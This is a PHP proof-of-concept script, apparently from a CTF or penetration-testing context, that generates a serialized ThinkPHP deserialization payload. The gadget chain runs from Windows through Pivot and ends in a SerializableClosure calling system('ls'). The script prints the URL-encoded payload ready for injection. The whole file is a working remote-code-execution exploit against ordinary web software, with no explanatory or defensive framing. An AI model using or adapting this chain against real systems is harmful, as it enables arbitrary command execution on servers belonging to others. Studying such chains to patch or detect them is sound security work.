<?php
namespace think;
require __DIR__ . '/vendor/autoload.php'; //因加载文件，所以需在tp框架内用
use Opis\Closure\SerializableClosure;

abstract class Model{
    private $data = [];
    private $withAttr = [];

    function __construct(){
        $this->data = ["lin"=>''];
        # withAttr中的键值要与data中的键值相等
        $this->withAttr = ['lin'=> new SerializableClosure(function(){system('ls');}) ];
    }
}


namespace think\model;
use think\Model;
class Pivot extends Model
{
}

namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}


echo urlencode(serialize(new Windows()));
?>